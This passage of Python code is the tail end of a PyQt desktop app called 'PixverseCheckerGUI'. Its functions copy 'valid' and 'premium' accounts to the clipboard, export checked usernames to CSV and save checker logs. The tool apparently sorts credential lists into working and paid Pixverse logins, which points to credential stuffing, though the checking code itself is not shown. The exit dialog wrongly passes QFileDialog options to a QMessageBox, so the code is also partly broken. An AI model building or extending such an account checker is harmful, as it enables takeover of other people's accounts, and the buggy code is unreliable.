        """Copy valid accounts to clipboard"""
        valid_text = self.valid_output.toPlainText()
        if valid_text.strip():
            clipboard = QApplication.clipboard()
            clipboard.setText(valid_text)
            self.log("📋 Copied valid AI accounts to clipboard")
        else:
            QMessageBox.warning(self, "Warning", "No valid accounts to copy!")
    
    def copy_premium(self):
        """Copy premium accounts to clipboard"""
        premium_text = self.premium_output.toPlainText()
        if premium_text.strip():
            clipboard = QApplication.clipboard()
            clipboard.setText(premium_text)
            self.log("💎 Copied premium AI accounts to clipboard")
        else:
            QMessageBox.warning(self, "Warning", "No premium accounts to copy!")
    
    def clear_results(self):
        """Clear results table"""
        self.results_table.setRowCount(0)
        self.valid_output.clear()
        self.premium_output.clear()
        self.log("🗑️ Cleared all results")
    
    def save_logs(self):
        """Save logs to file"""
        logs = self.log_output.toPlainText()
        if not logs.strip():
            QMessageBox.warning(self, "Warning", "No logs to save!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save AI Logs", "pixverse_ai_checker_logs.txt", "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(logs)
                self.log(f"💾 AI Logs saved to {file_path}")
            except Exception as e:
                self.log(f"❌ Error saving logs: {str(e)}")
    
    def export_csv(self):
        """Export all results to CSV file"""
        if self.results_table.rowCount() == 0:
            QMessageBox.warning(self, "Warning", "No results to export!")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save Results as CSV", "pixverse_results.csv", "CSV Files (*.csv);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    
                    # Write header
                    headers = []
                    for col in range(self.results_table.columnCount()):
                        headers.append(self.results_table.horizontalHeaderItem(col).text())
                    writer.writerow(headers)
                    
                    # Write data
                    for row in range(self.results_table.rowCount()):
                        row_data = []
                        for col in range(self.results_table.columnCount()):
                            item = self.results_table.item(row, col)
                            row_data.append(item.text() if item else "")
                        writer.writerow(row_data)
                
                self.log(f"📊 Exported all results to CSV: {file_path}")
            except Exception as e:
                self.log(f"❌ Error exporting CSV: {str(e)}")
    
    def test_selected_account(self):
        """Test the selected account"""
        current_row = self.results_table.currentRow()
        if current_row >= 0:
            username = self.results_table.item(current_row, 2).text()
            # You would need to store passwords in a separate way or retrieve them
            self.log(f"🎬 Testing account: {username}")
            # Implement actual testing logic here
        else:
            QMessageBox.warning(self, "Warning", "Please select an account from the table!")
    
    def log(self, message):
        """Add log message"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_output.appendPlainText(f"[{timestamp}] {message}")
        
        # Auto-scroll
        scrollbar = self.log_output.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def closeEvent(self, event):
        """Handle window close"""
        if self.checker.is_running:
            reply = QMessageBox.question(
                self, "Confirm Exit",
                "Checking is still running. Are you sure you want to exit?",
                QMessageBox.Yes | QFileDialog.Option.No,
                QFileDialog.Option.No
            )
            
            if reply == QMessageBox.Yes:
                self.checker.stop_checking()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()

def main():
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle('Fusion')
    
    # Set application font
    font = QFont("Segoe UI", 10)
    app.setFont(font)
    
    # Create and show window
    window = PixverseCheckerGUI()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()